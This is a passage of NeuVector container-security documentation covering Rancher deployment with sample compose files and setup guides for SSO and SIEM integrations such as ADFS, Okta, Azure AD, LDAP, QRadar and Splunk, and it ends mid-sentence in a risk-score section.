NeuVector tile/button, which when clicked will take you to the NeuVector console, in a new tab.    When this Single Sign On (SSO) access method is used for the first time, a corresponding user in the NeuVector cluster is created for the Rancher user login. The same user name of the Rancher logged in user will be created in NeuVector, with a role of either admin or fedAdmin, and Identity provider as Rancher.    Note in the above screen shot, two Rancher users admin and gkosaka have been automatically created for SSO. If another user is create manually in NeuVector, the Identity provider would be listed as NeuVector, as shown below. This local user can login directly to the NeuVector console without going through Rancher.    important It is recommended to login directly to the NeuVector console as admin/admin to manually change the admin password to a strong password. This will only change the NeuVector identity provider admin user password (you may see another admin user whose identify provider is Rancher). Alternatively, include a ConfigMap as a secret in the initial deployment from Rancher (see chart values for ConfigMap settings) to set the default admin password to a strong password.  Disabling NeuVector/Rancher SSO​  To disable the ability to login to NeuVector from Rancher Manager, go to Settings -&gt; Configuration.    Rancher Legacy Deployments​  The sample file will deploy one manager and 3 controllers. It will deploy an enforcer on every node. See the bottom section for specifying dedicated manager or controller nodes using node labels. Note: It is not recommended to deploy (scale) more than one manager behind a load balancer due to potential session state issues.  note Deployment on Rancher 2.x/Kubernetes should follow the Kubernetes reference section and/or Helm based deployment.  Deploy the catalog docker-compose-dist.yml, controllers will be deployed on the labelled nodes, enforcers will be deployed on the rest of nodes. (The sample file can be modified so that enforcers are only deployed to the specified nodes.) Pick one of controllers for the manager to connect to. Modify the manager's catalog file docker-compose-manager.yml, set CTRL_SERVER_IP to the controller's IP, then deploy the manager catalog.  Here are the sample compose files. If you wish to only deploy one or two of the components just use that section of the file.  Rancher Manager/Controller/Enforcer Compose Sample File:  manager: scale: 1 image: neuvector/manager restart: always environment: - CTRL_SERVER_IP=controller ports: - 8443:8443 controller: scale: 3 image: neuvector/controller restart: always privileged: true environment: - CLUSTER_JOIN_ADDR=controller volumes: - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro - /var/neuvector:/var/neuvector enforcer: image: neuvector/enforcer pid: host restart: always privileged: true environment: - CLUSTER_JOIN_ADDR=controller volumes: - /lib/modules:/lib/modules - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro labels: io.rancher.scheduler.global: true   ","version":"5.3","tagName":"h3"},{"title":"Deploy Without Privileged Mode​","type":1,"pageTitle":"Rancher Deployment","url":"/deploying/rancher#deploy-without-privileged-mode","content":" On some systems, deployment without using privileged mode is supported. These systems must support the ability to add capabilities using the cap_add setting and to set the apparmor profile.  See the sections on deployment with Docker-Compose, Docker UCP/Datacenter for sample compose files.  Here is a sample Rancher compose file for deployment without privileged mode:  manager: scale: 1 image: neuvector/manager restart: always environment: - CTRL_SERVER_IP=controller ports: - 8443:8443 controller: scale: 3 image: neuvector/controller pid: host restart: always cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=controller volumes: - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro - /var/neuvector:/var/neuvector enforcer: image: neuvector/enforcer pid: host restart: always cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=controller volumes: - /lib/modules:/lib/modules - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro labels: io.rancher.scheduler.global: true   ","version":"5.3","tagName":"h3"},{"title":"Using Node Labels for Manager and Controller Nodes​","type":1,"pageTitle":"Rancher Deployment","url":"/deploying/rancher#using-node-labels-for-manager-and-controller-nodes","content":" To control which nodes the Manager and Controller are deployed on, label each node. Pick the nodes where the controllers are to be deployed. Label them with &quot;nvcontroller=true&quot;. (With the current sample file, no more than one controller can run on the same node.).  For the manager node, label it “nvmanager=true”.  Add labels in the yaml file. For example for the manager:   labels: io.rancher.scheduler.global: true io.rancher.scheduler.affinity:host_label: &quot;nvmanager=true&quot;   For the controller:   labels: io.rancher.scheduler.global: true io.rancher.scheduler.affinity:host_label: &quot;nvcontroller=true&quot;   For the enforcer, to prevent it from running on a controller node (if desired):   labels: io.rancher.scheduler.global: true io.rancher.scheduler.affinity:host_label_ne: &quot;nvcontroller=true&quot;  ","version":"5.3","tagName":"h3"},{"title":"SAML (ADFS)","type":0,"sectionRef":"#","url":"/integration/adfs","content":"","keywords":"","version":"5.3"},{"title":"Setting Up ADFS and NeuVector Integration​","type":1,"pageTitle":"SAML (ADFS)","url":"/integration/adfs#setting-up-adfs-and-neuvector-integration","content":" This section describes the setup steps in ADFS first, then in the NeuVector console.  ADFS Setup​  From AD FS Management, right click on “Relying Party Trusts” and select “Add Relying Party Trust…”.    Select “Start” button from Welcome step.    Select “Enter data about the relying party manually” and select “Next”.    Enter a unique name for Display name field and select “Next”.    Select “Next” to skip token encryption.    Check “Enable support for the SAML 2.0 WebSSO protocol” and enter the SAML Redirect URI from NeuVector Settings&gt;SAML Setting page into the “Relying party SAML 2.0 SSO service URL” field. Select “Next” to continue.    Enter the same SAML Redirect URI into the “Relying party trust identifier” field and click “Add”; then select “Next” to continue.    Customize Access Control; then select “Next” to continue.    Select “Next” to continue.    Select “Close” to finish. Select Edit Claim Issuance Policy…    Select “Add Rule…” and choose “Send LDAP Attributes as Claims”; then select “Next”. Name the rule and choose Active Directory as the Attribute store. Only Username outgoing claim is required for authentication if default role is set; else groups is needed for role mapping. Email is optional.  SAM-Account-Name -&gt; UsernameE-Mail-Address -&gt; EmailToken-Groups – Unqalified Names -&gt; groups    Select “Add Rule…” and choose “Transform an Incoming Claim”; then select “Next”. Name the rule and set the field as captured in the screenshot below. The Outgoing name ID format needs to be Transient Identifier.    NeuVector Setup​  Identify Provider Single Sign-On URL  View Endpoints from AD FS Management &gt; Service and use “SAML 2.0/WS-Federation” endpoint URL.Example: https://&lt;adfs-fqdn&gt;/adfs/ls  Identity Provider Issuer  Right click on AD FS from AD FS Management console and select “Edit Federation Service Properties…”; use the “Federation Service identifier”.Example: http://&lt;adfs-fqdn&gt;/adfs/services/trust  X.509 Certificate  From AD FS Management, select Service &gt; Certificate, right click on Token-signing certificate and choose “View Certificate…”Select the Details tab and click “Copy to File”Save it as a Base-64 encoded x.509 (.CER) fileCopy and paste the contents of the file into the X.509 Certificate field  Group claim  Enter the Outgoing claim name for the groupsExample: groups  Default role  Recommended to be “None” unless you want to allow any authenticated user a default role.  Role map  Set the group names of the users for the appropriate role. (See screenshot example below.)    Mapping Groups to Roles and Namespaces​  Please see the Users and Roles section for how to map groups to preset and custom roles as well as namespaces in NeuVector.  ","version":"5.3","tagName":"h3"},{"title":"Troubleshooting​","type":1,"pageTitle":"SAML (ADFS)","url":"/integration/adfs#troubleshooting","content":" ADFS SamlResponseSignature needs to be either MessageOnly or MessageAndAssertion. Use Get-AdfsRelyingPartyTrust command to verify or update it.    Time synchronization between Kubernetes Nodes x ADFS Server  For a successful authentication, the time between the Kubernetess nodes and the ADFS server needs to be the same to avoid time sync or clock drift issues.  It's recommended to use an NTP server, with equal time settings across all servers.  Please check and confirm that both ADFS and NeuVector hosts are synchronized and the potential delays do not exceed more than 10 seconds. You can use Linux and Windows commands to check dates, times and NTP server activity.  tip You can reload the auth times by disabling and enabling again the config in the NeuVector UI as follows: Log in to NeuVector with Admin UserGo to SettingsClick on the button to disable and enable the SAML setting Make sure to keep the configuration settings! Once the setting has been re-enabled, you can try to log in with an ADFS user. If it works, this confirms the issue was due to a time synchronization error between Kubernetes nodes and the ADFS Server.  SAML characters must be case sensitive in NeuVector UI  Attribute names are case sensitive. Make sure any SAML attribute name configured here is an exact match to the application configuration. SAML must point to the correct URL to authenticate.  All the fields in NeuVector UI -&gt; Settings -&gt; SAML Settings are case-sensitive.  The NeuVector controller logs contain the relevant information about authentication with the ADFS server and errors that will help identify the root cause. We recommended recreate the failed login condition and check the logs.  Make sure to enter the correct groups, certificates and protocols  The SAML settings need to match the following configuration:  Setting\tValueIdentify Provider Single Sign-On URL\tRequires HTTPS protocol Identity Provider Issuer\tRequires HTTP protocol ADFS SamlResponseSignature\tNeeds to be either MessageOnly or MessageAndAssertion  attention These settings need to be validated on your ADFS server and in the NeuVector UI.  The selected certificate needs to be valid and correctly generated, including its CA Root and Intermediate Certificates. You can generate them using your trusted certificate authority, Windows or an automation tool such as LetsEncrypt.  If any of these parameters are incorrect, you will receive an Authentication Failed error when you try to log in to NeuVector with an ADFS user using SAML authentication. ","version":"5.3","tagName":"h3"},{"title":"IBM QRadar","type":0,"sectionRef":"#","url":"/integration/ibmqr","content":"","keywords":"","version":"5.3"},{"title":"Integrating with IBM Qradar​","type":1,"pageTitle":"IBM QRadar","url":"/integration/ibmqr#integrating-with-ibm-qradar","content":" The IBM® QRadar® Security Information and Event Management (SIEM) helps security teams accurately detect and prioritize threats across the enterprise, and it provides intelligent insights that enable teams to respond quickly to reduce the impact of incidents. By consolidating log events and network flow data from thousands of devices, endpoints and applications distributed throughout your network, QRadar correlates all this different information and aggregates related events into single alerts to accelerates incident analysis and remediation. QRadar SIEM is available on premises and in a cloud environment.  NeuVector is a full lifecycle container security platform which fully supports QRadar integration. This integration enables QRadar to be able to collect events, logs and incident information for container and Kubernetes environment. By using NeuVector’s DSM for QRadar, customers will be able to normalize the NeuVector security log data in QRadar, then analyze, report or remediate container security events.  IBM QRadar and NeuVector DSM​  The NeuVector DSM for integrating with IBM QRadar is published and IBM validated on the IBM X-Force / App Exchange website. It is available for download here from the App Exchange website.  It is also available for download from this site here  How to Integrate NeuVector with QRadar​  Before importing the NeuVector DSM into QRadar, we recommend you check/modify these QRadar configurations to make sure everything will work as expected:  IBM QRadar version 7.3.1 and laterConfigure QRadar “System Settings” to make sure the Syslog Payload Length is big enough for example:    Configure NeuVector to Send Syslog to QRadar​  Enable Syslog configuration in Settings -&gt; Configuration. The Server IP/URL and port should be pointing to the QRadar service IP and Port, and the default Syslog port will be 514. Use the UDP protocol and “In Json” log format. Select the log level and categories to report. In a multi-cluster NeuVector environment, to collect all clusters logs, this setting needs to be enabled in every cluster. You can configure the cluster name on this page to distinguish cluster events from each other.    Configure QRadar to Analyze NeuVector Logs​  Enable or Import the NeuVector DSM to QRadar When adding a new QRadar log source, if “NeuVector” appears in the QRadar log source type, then please ignore the log source importing instructions below and take the next step “Add and enable log sources for NeuVector”.    If the “NeuVector” log source type was not found in QRadar, please refer to QRadar user manual to install NeuVector DSM via Admin &gt; Extension Management.    Add and enable log sources for NeuVector  Now we can add a new log source for NeuVector logs:    “Log Source Identifier” should be the lead controller’s pod name. NeuVector’s lead controller’s pod name can be found in the raw log data of QRadar or from NeuVector’s management console “Assets\\Controllers” as below:    Multiple log sources should be added if there are multiple NeuVector clusters running. NeuVector log source is added and enabled:    Verify the Log Activities​  Generate some NeuVector logs, for example Network Policy Violations, Configuration change events or do some Vulnerability Scans on containers/nodes. These incident or event logs will be sent to QRadar in seconds. And the NeuVector logs should be normalized in QRadar console. It can also be verified through QRadar’s DSM editor:      Integration Summary​  With the completed integration, NeuVector security and management events can be managed through QRadar together with event data from other sources. QRadar serves as the permanent event storage for NeuVector events, while the NeuVector controller performs real-time security responses and short-term cluster storage for events. QRadar can perform advanced correlation and alerting for critical container and Kubernetes security events. ","version":"5.3","tagName":"h3"},{"title":"IBM Security Advisor","type":0,"sectionRef":"#","url":"/integration/ibmsa","content":"","keywords":"","version":"5.3"},{"title":"Integrating with IBM Security Advisor​","type":1,"pageTitle":"IBM Security Advisor","url":"/integration/ibmsa#integrating-with-ibm-security-advisor","content":" NeuVector Integrates with IBM Security Advisor on IBM Cloud.  To generate the registration URL required, please log into the NeuVector console as an administrator and go to Settings -&gt; Configuration.  Enable &quot;Integrate with IBM Security Advisor&quot; -&gt; SubmitClick &quot;Get URL&quot; -&gt; Copy to clipboard    Then return to the IBM Security Advisor console, and under &quot;Enter the NeuVector setup URL&quot;, type in https://{NeuVector controller hostname/ip}:{port} and paste what is copied in from the steps above. For the port, use the exposed NeuVector REST API port (default is 10443). For multi-cluster environments this is also the 'fed-worker' service which exposes this port.  IBM Security Advisor will communicate with your NeuVector cluster controller thru the provided hostname or IP. Note: This may need to be exposed as a service for access from outside the Kubernetes cluster, similar to how the REST API is exposed as a service.  Verifying the Connection​  When the connection is successfully created between IBM Security Advisor &amp; NeuVector, you will see the green &quot;Connected at {date, time}&quot; icon next to &quot;Integrate with IBM Security Advisor&quot; in the NeuVector Console.    Reviewing Security Events in IBM Security Advisor​  A summary card with security event information is displayed.    Each security event can be investigated in more detail, as shown below:    ","version":"5.3","tagName":"h3"},{"title":"Removing the Integration​","type":1,"pageTitle":"IBM Security Advisor","url":"/integration/ibmsa#removing-the-integration","content":" If you delete a NeuVector integration connection in your IBM Cloud account, remember to also disable the &quot;IBM SA integration&quot; for that NeuVector cluster in Settings -&gt; Configuration. ","version":"5.3","tagName":"h3"},{"title":"Enterprise Integration","type":0,"sectionRef":"#","url":"/integration/integration","content":"","keywords":"","version":"5.3"},{"title":"Integration​","type":1,"pageTitle":"Enterprise Integration","url":"/integration/integration#integration","content":" NeuVector provides a number of ways to integrate, including a REST API, CLI, SYSLOG, RBACs, SAML, LDAP, and webhooks. See the Automation section for examples of scripting using the REST API.  Integrations with other ecosystem partners such as Sonatype (Nexus Lifecycle), IBM Cloud (QRadar and Security Advisor), Prometheus/Grafana, are also supported. Many of these can be found on the NeuVector Github page.  The following configurations can be found in Settings:  OpenShift/Kubernetes RBACs​  Select this option if you are using Red Hat OpenShift Role Based Access Controls (RBACs) and would like NeuVector to automatically read and enforce those. If selected, OpenShift users can log into the NeuVector console using their OpenShift credentials, and will only have access to the resources (Projects, containers, nodes etc) according to their role in the OpenShift cluster. OpenShift integration uses the OAuth2 protocol.    important Do not use the setting in OpenShift AllowAllPasswordIdentityProvider which allows any password to be used to log in. This will allow a user to login into NeuVector with any password as well (as a read only user). It will also create a new user in OpenShift for every login (see ‘oc get user’ results).  note The default Admin user of NeuVector and any additional users created in NeuVector will still be active with OpenShift RBACs enabled.  Kubernetes RBACs​  To manually configure RBACs for Kubernetes namespaces, open the Advanced Setting in the new user creation screen in Settings -&gt; Users -&gt; Add User. Here you can enter the namespaces(s) which this user should have access to in NeuVector.    SYSLOG​  Enter the SYSLOG server IP and select the level of notification. You can also use a DNS name and/or select TCP for configuration.  Webhooks​  Notifications can be sent via webhooks to an endpoint. Enter the endpoint URL for notifications to be sent. Webhook notifications for custom events can be configured in Policy -&gt; Response Rules  Directory/SSO Integration​  See the next sections for LDAP, MSAD, SAML, OpenId and other integrations. See the Basics -&gt; Users &amp; Roles section for predefined and custom roles in NeuVector which can be mapped in the integration. ","version":"5.3","tagName":"h3"},{"title":"LDAP","type":0,"sectionRef":"#","url":"/integration/ldap","content":"","keywords":"","version":"5.3"},{"title":"LDAP​","type":1,"pageTitle":"LDAP","url":"/integration/ldap#ldap","content":" Configure the required fields to connect to your LDAP server.    Port. The default port is 389 for SSL disabled and 636 for SSL enabled.User name (optional). We use this admin user name to bind the ldap server for each query.Base dn. This should be a root node in ldap server to search for the ldap user and group.Default role. This is the role that a user will take if role group mapping (below) fails. If the user’s group attribute is found that can be mapped to a role, then the default role will not be used. If no matching group attribute is found, the default role will be taken. If the default role is None in this case, the user login will fail. The ‘test connection’ button will check if a username/password can be authenticated by the configured LDAP server.Admin and Reader role map. This defines how to map a user’s LDAP group membership to the user role in NeuVector. Add the LDAP group list to the corresponding roles. When looking up a user’s group membership in LDAP schema, we assume the group’s member attribute is named as “memberUid”.  Mapping Groups to Roles and Namespaces​  Please see the Users and Roles section for how to map groups to preset and custom roles as well as namespaces in NeuVector. ","version":"5.3","tagName":"h3"},{"title":"Microsoft AD","type":0,"sectionRef":"#","url":"/integration/msad","content":"","keywords":"","version":"5.3"},{"title":"Configuring Active Directory​","type":1,"pageTitle":"Microsoft AD","url":"/integration/msad#configuring-active-directory","content":" This explains how NeuVector authenticates with Windows Active Directory. The configuration page for Windows Active Directory server is shown below.    User name: This can be any user who has read permission on the Base DN object. The dn attribute should be used as shown below, or the windows logon name such as user@local.nvtest.com.    Base DN: This is a root Windows Active Director object for user authentication. The minimum access permission requirement is read. As shown in the example above, the OU=IT,DC=local,DC=nvtest,DC=com object is only allowed for a user account which is defined in the User name field to allow a read.    With the above User name and Base DN settings, NeuVector is able to bind with Windows Active Directory successfully. Click the TEST CONNECTION to check it.    User name: It is required to use the sAMAccountName attribute ONLY to match. For example, in the screen below NeuVector is going to verify if the ituser(CN=ituser,OU=IT,DC=local,DC=nvtest,DC=com) user is able to login with NeuVector web console.  note NeuVector doesn't use the values of cn, displayName, dn, givenName, name or userPrincipalName attributes etc to verify the test user.    The last part is role mapping for NeuVector for the web console login.    In the example above, the defined group, _d_s_itgroup, in the NeuVector role must have member and sAMAccountType attributes. The value of the sAMAccountType attribute MUST be 268435456 which is the Global Security group and the login username must be in the member lists.    Group member attribute: This is a member attribute for Windows Active Directory by default and it is used for the role mapping purpose, as shown above. If all the requirements are met above, the Windows Active Directory user should be able to login to the NeuVector web console successfully.  Mapping Groups to Roles and Namespaces​  Please see the Users and Roles section for how to map groups to preset and custom roles as well as namespaces in NeuVector. ","version":"5.3","tagName":"h3"},{"title":"OpenID Connect (OIDC) for ADFS","type":0,"sectionRef":"#","url":"/integration/oidc_adfs","content":"","keywords":"","version":"5.3"},{"title":"Integrating with OpenID Connect (OIDC) for ADFS​","type":1,"pageTitle":"OpenID Connect (OIDC) for ADFS","url":"/integration/oidc_adfs#integrating-with-openid-connect-oidc-for-adfs","content":" From AD FS Management, click on &quot;Application Groups&quot; and then click on &quot;Add Application Group...&quot;    Enter a name, select &quot;Server application accessing a web API&quot; and then click Next    Enter Redirect URI from NeuVector Settings &gt; OpenID Connect Setting page and then click Next    Enable &quot;Generate a shared secret&quot; checkbox and then click Next    Enter the Identifier created in previous step and then click Next      Enable allatclaims, email, openid and profile scopes and then click Next        Double click on an application group you just created previously    Double click on Web API and then click Issuance Transform Rules tab    Click Add Rule... and select &quot;Send LDAP Attributes as Claims&quot; and then click Next    Enter a Claim rule name, choose Active Directory as the Attribute store and provide the mapping of LDAP attributes to outgoing claim types as below  Token-Groups – Unqualified Names -&gt; groupsUser-Principal-Name -&gt; preferred_usernameE-Mail-Address -&gt; email      NeuVector Setup​  Identity Provider Issuer: https://&lt;adfs-fqdn&gt;/adfsClient ID: It is a &quot;Client Identifier&quot; showing in &quot;Server application&quot; dialog in &quot;Add Application Group Wizard&quot;Client Secret: It is a Secret showing in &quot;Configure Application Credentials&quot; dialog in &quot;Add Application Group Wizard&quot;Group Claim: groups       ","version":"5.3","tagName":"h3"},{"title":"SAML (Azure AD)","type":0,"sectionRef":"#","url":"/integration/msazure","content":"","keywords":"","version":"5.3"},{"title":"Integrate with Azure AD SAML authentication​","type":1,"pageTitle":"SAML (Azure AD)","url":"/integration/msazure#integrate-with-azure-ad-saml-authentication","content":" In the Azure management console, select the ”Enterprise applications&quot; menu item in Azure Active Directory    Select “New Application”    Create a Non-gallery application and give it a unique name    In the application's configuration page, select &quot;Single sign-on&quot; in the left-side panel and choose the SAML-based sign-on    Download the certificate in the base64 format and note the application's Login URL and Azure AD Identifier    In the NeuVector management console, login as an administrator. Select “Settings&quot; in the administrator dropdown menu at the top-right corner. Click SAML settings    Configure the SAML server as follows:  Copy application's &quot;Login URL&quot; as the Single Sign-On URL.Copy &quot;Azure AD Identifier&quot; as the Issuer.Open downloaded the certificate and copy the text to X.509 Certificate box.Set a default role.Enter the group name for role mapping. The group claim returned by Azure are identified by the &quot;Object ID&quot; instead of the name. The group's object ID can be located in Azure Active Directory &gt; Groups &gt; Group name Page. You should use this value to configure group-based role mapping in NeuVector.    Then Enable the SAML server.    Copy the Redirect URL    Return to the Azure management console to setup &quot;Basic SAML Configuration&quot;. Copy NeuVector console's Redirect URL to both &quot;Identifier&quot; and &quot;Reply URL&quot; boxes    Edit &quot;SAML Signing Certificate&quot;, changing the Signing Option to &quot;Sign SAML response&quot;    Edit &quot;User Attributes &amp; Claims&quot; so the response can carry the login user's attributes back to NeuVector. Click &quot;Add new claim&quot; to add &quot;Username&quot; and &quot;Email&quot; claims with &quot;user.userprincipalname&quot; and &quot;user.mail&quot; respectively.    If the users are assigned to the groups in the active directory, their group membership can be added to the claim. Find the application in &quot;App registrations&quot; and edit the manifest. Modify the value of &quot;groupMembershipClaims&quot; to &quot;All&quot;.    Authorize users and groups to access the application so they can login NeuVector console with Azure AD SAML SSO    Mapping Groups to Roles and Namespaces​  Please see the Users and Roles section for how to map groups to preset and custom roles as well as namespaces in NeuVector. ","version":"5.3","tagName":"h3"},{"title":"OpenID Connect Azure/Okta","type":0,"sectionRef":"#","url":"/integration/openid","content":"","keywords":"","version":"5.3"},{"title":"Integrating with OpenID Connect (OIDC) for Azure and Okta​","type":1,"pageTitle":"OpenID Connect Azure/Okta","url":"/integration/openid#integrating-with-openid-connect-oidc-for-azure-and-okta","content":" To enable OpenID Connect authentication, the Issuer, Client ID and Client secret settings are required. With the issuer URL, NeuVector will call the discovery API to retrieve the Authenorization, Token and User info endpoints.  Locate the OpenID Connect Redirect URI on the top of the NeuVector OpenID Connect Setting page. You will need copy this URI to the Login redirect URIs for Okta and Reply URLs for Microsoft Azure.    Microsoft Azure Configuration​  In Azure Active Directory &gt; App registrations &gt; Application name &gt; Settings Page, locate Application ID string. This is used to set the Client ID in NeuVector. The Client secret can be located in Azure's Keys setting.    The Issuer URL takes https://login.microsoftonline.com/{tenantID}/v2.0 format. To locate the tenantID, go to Azure Active Directory &gt; Properties Page and found the Directory ID, replace it with the tenantID in the URL    If the users are assigned to the groups in the active directory, their group membership can be added to the claim. Find the application in Azure Active Directory -&gt; App registrations and edit the manifest. Modify value of &quot;groupMembershipClaims&quot; to &quot;Application Group&quot;. There is a maximum number of groups that will get emitted into a token. If the user belongs to a large number of groups ( &gt; 200) and the value &quot;All&quot; is used, the token will not include the groups and authorization will failed. Using the value &quot;Application Group&quot; instead of &quot;All&quot; will reduce the number of applicable groups returned in the token.  By default, NeuVector looks for &quot;groups&quot; in the claim to identify the user's group membership. If other claim name is used, you can customize the claim name in NeuVector's OpenID Connect Setting page.  The group claim returned by Azure are identified by the &quot;Object ID&quot; instead of the name. The group's object ID can be located in Azure Active Directory &gt; Groups &gt; Group name Page. You should use this value to configure group-based role mapping in NeuVector -&gt; Settings.    Verify Permissions  Make sure the following permissions have been set from Microsoft Graph  email - View users' email addressopenid - Sign users inprofile - View users' basic profile  Okta Configuration​  Login to your Okta account.  On the lefthand side menu, click “Applications -&gt; Applications“ In the center pane, click “Create App Integration”:    A new pane will pop up to select the “Sign-in method”:    Select “OIDC – OpenID Connect” option.  A derived pane will appear, for “Application Type” selection:    Select “Native Application” option.  The central pane will now show the Native App Integration form where you have to fill in accordingly the following values:  For General Settings section:  App. Integration Name: Name for this integration. Freely choose any name Grant Type (check):  Authorization CodeRefresh TokenResource Owner PasswordImplicit (hybrid)  For Sign-in redirect URIs section:  Go to your NeuVector console and navigate to “Settings” -&gt; “OpenId Connect Settings”. At the top of the page, next to “OpenID Connect Redirect URI” label click “Copy to Clipboard”.    This will copy to the redirect URI to memory. Paste it in its corresponding textbox:    For Assignments section:  Select “Allow everyone in your organization to access” to have this integration available for everyone in your org.    Then click the save button at the bottom of the page.  Once your general setting are saved, you will be taken to your new application integration setup and a client Id will be generated automatically.  In “Client Credentials” section, click edit and modify the “Client Authentication” section from “Use PKCE (for public clients)” to “Use Client Authentication”, and hit save. This will generate a new secret automatically which we will need in upcoming NeuVector setup steps:    Navigate to the “Sign On” tab and edit the “OpenID Connect ID Token” section: Change the Issuer from “Dynamic (based on request domain)” to the fixed “Okta URL”:    The Okta console can operate in two modes, Classic Mode and Developer Mode. In classic mode, the issuer URL is located at Okta Application page's Sign On Tab. To have the user's group membership returned in the claim, you need to add &quot;groups&quot; scope in the NeuVector OpenID Connect configuration page:    In the Developer Mode, Okta allows you to customize the claims. This is done in the API page by managing Authorization Servers (navigate to left hand menu -&gt; Security -&gt; API). The issuer URL is located in each authorization server's Settings tab:    Claims are name/value pairs that contain information about a user as well as meta-information about the OIDC service. In “OpenID Connect ID Token” section, you can create new claims for user's Groups and carry the claim in the ID Token (an ID Token is a JSON Web Token, a compact URL-Safe means of representing claims to be transferred between two parties, so identity information about the user is encoded right into the token and the token can be definitively verified to prove that is hasn’t been tampered with). If a specific scope is configured, make sure to add the scope to NeuVector OpenID Connect setting page, so that the claim can be included after the user is authenticated:    By default, NeuVector looks for &quot;groups&quot; in the claim to identify the user's group membership. If other claim name is used, you can customize the claim name in NeuVector's OpenID Connect Setting page. To configure claims, edit the “OpenID Connect ID Token” section as shown in the next image:    In your application integration page, navigate to “Assignments” tab and make sure you have the corresponding assignments listed:    NeuVector OpenID Connect Configuration​  Configure the proper Issuer URL, Client ID and Client secret in the page.    After the user is authenticated, the proper role can be derived with group-based role mapping configuration. To setup group-based role mapping,  If group-based role mapping is not configured or the matched groups cannot be located, the authenticated user will be assigned with the Default role. If the Default role is set to None, when group-based role mapping fails, the user is not able to login.Specify a list of groups respectively in Admin and Reader role map. The user's group membership is returned by the claims in the ID Token after the user is authenticated. If the matched group is located, the corresponding role will be assigned to the user.  The group can be mapped to the Admin role in NeuVector. Individual users can be 'promoted' to a Federated Admin role by logging in as a local cluster admin, selecting the user with Identify Provider 'OpenID', and editing their role in Settings -&gt; Users/Roles.  Mapping Groups to Roles and Namespaces​  Please see the Users and Roles section for how to map groups to preset and custom roles as well as namespaces in NeuVector. ","version":"5.3","tagName":"h3"},{"title":"SAML (Okta)","type":0,"sectionRef":"#","url":"/integration/saml","content":"","keywords":"","version":"5.3"},{"title":"SAML IDP Configuration​","type":1,"pageTitle":"SAML (Okta)","url":"/integration/saml#saml-idp-configuration","content":" To configure NeuVector to use Okta SAML IDP server, first, configure the SAML IDP server on the Okta site.    Copy &quot;SAML Redirect URI&quot; from NeuVector SAML Setting page, paste it to Okta's single sign on url, recipient url and destination url fields.Assertion encryption: This field must be unencrypted.Attribute statements: Enter the email and username attributes.Group attribute statements: Enable this if group-based role mapping is required. The default attribute name that NeuVector looks for is NVRoleGroup. If other attribute name is used for the user's group membership, it can be customized in NeuVector's SAML Setting page.  Configure SAML settings in NeuVector UI console.    Use &quot;View Setup Instructions&quot; button as shown in the following screenshot to locate following information, and copy them into NeuVector's SAML page.  Identity Provider Single Sign-On URLIdentity Provider IssuerX.509 CertificateSpecify group attribute name if non-default value is used.    After the user is authenticated, the proper role can be derived with group-based role mapping configuration. To setup group-based role mapping,  If group-based role mapping is not configured or the matched groups cannot be located, the authenticated user will be assigned with the Default role. If the Default role is set to None, when group-based role mapping fails, the user is not able to login.Specify a list of groups respectively in Admin and Reader role map. The user's group attribute is piggybacked in the response after the user is authenticated. If the matched group is located, the corresponding role will be assigned to the user.  Mapping Groups to Roles and Namespaces​  Please see the Users and Roles section for how to map groups to preset and custom roles as well as namespaces in NeuVector. ","version":"5.3","tagName":"h3"},{"title":"Navigating NeuVector","type":0,"sectionRef":"#","url":"/navigation","content":"Navigating NeuVector Console Menu and Navigation","keywords":"","version":"5.3"},{"title":"Splunk","type":0,"sectionRef":"#","url":"/integration/splunk","content":"","keywords":"","version":"5.3"},{"title":"Integrating with Splunk with the NeuVector Splunk App​","type":1,"pageTitle":"Splunk","url":"/integration/splunk#integrating-with-splunk-with-the-neuvector-splunk-app","content":" The NeuVector Splunk App can be found in the splunkbase catalog here or by searching for NeuVector.  The NeuVector Security dashboard helps to identify security events such as suspicious login attempts, network violations and vulnerable images.  Below are sample screens displayed in the Splunk app.  Image Vulnerabilities​    Admission Control and Security Events​    Network Violations by Pod/Service (Deployments)​    Egress Connection Summary​    NeuVector Login Activity Dashboard​    ","version":"5.3","tagName":"h3"},{"title":"Setup and Configuration​","type":1,"pageTitle":"Splunk","url":"/integration/splunk#setup-and-configuration","content":" Getting the app​  GitHub​  Download the latest app tarball (neuvector_app.tar.gz) from the neuvector/neuvector-splunk-app repository.  Splunkbase​  Download the latest app tarball from Splunkbase.  Splunk Apps Browser​  In the Splunk UI, click on the Apps dropdown, click &quot;Find More Apps&quot;, then search for NeuVector Splunk App.  Installation and Setup​  Install the app by either uploading the tarball or following the Splunkbase prompts.  Configure syslog in NeuVector console  Go to Settings -&gt; Configuration -&gt; Syslog  a. set the server value as the IP address that Splunk is running b. choose TCP as the protocol; c. set port number as 10514; d. choose Info Level; e. click SUBMIT to save the setting.    You can configure multiple clusters to send syslog to your splunk instance and your splunk instance will receive these syslogs in real time.  FAQs​  What user role is required?​  Any user role. ","version":"5.3","tagName":"h3"},{"title":"Improve Security Risk Score","type":0,"sectionRef":"#","url":"/navigation/improve_score","content":"","keywords":"","version":"5.3"},{"title":"Improving the Security Risk Score​","type":1,"pageTitle":"Improve Security Risk Score","url":"/navigation/improve_score#improving-the-security-risk-score","content":" The Security Risk Score in the Dashboard provides a score between 0 and 100.  0-20 Good21-50 Fair51-100 Poor  The score is the sum of following metrics, each shown as a maximum value, with a max 100:  NeuVector Protection Mode - 30Ingress/Egress Risk - 42Privileged Containers - 4Root Containers - 4Admission Controls - 4Vulnerabilities - 16 (Containers - 8, Host - 6, orchestrator Platform - 2)  By default, NeuVector includes all containers, including system containers, in the risk score. This can be customized for each learned container Group to disable certain containers from being included in the risk score calculation, as shown below.  How to Improve the Score​  NeuVector Protection Mode​  Change the New Service Protection Mode in Settings -&gt; Configuration to Monitor or ProtectChange all ‘learned’ Groups in Policy -&gt; Groups to Monitor or Protect  Or  Click the Tool icon to follow the Wizard to perform the above steps  Ingress/Egress Risk​  Click the Tool icon to follow 